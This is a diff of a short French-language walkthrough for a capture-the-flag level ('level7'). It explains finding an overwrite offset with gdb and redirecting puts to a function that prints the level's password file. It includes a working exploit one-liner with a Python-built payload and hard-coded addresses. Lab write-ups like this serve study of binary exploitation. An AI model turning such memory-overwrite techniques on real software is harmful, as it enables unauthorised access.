@@ -1,1 +1,9 @@
-./level7 `python -c "print 'A'*20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
+on va exploiter puts
+
+on regarde avec gdb a que offset on reecrit sur les registres
+avec les args abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+on voit que c'est a l'octet 20 qu'on peut remplacer l'adresse
+donc on met l'adresse du puts et dans le deuxieme argument on met l'adresse de la fonction "m" qui va lancer la commende cat sur le .pass
+
+donc -> ./level7 `python -c "print 'A'*20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
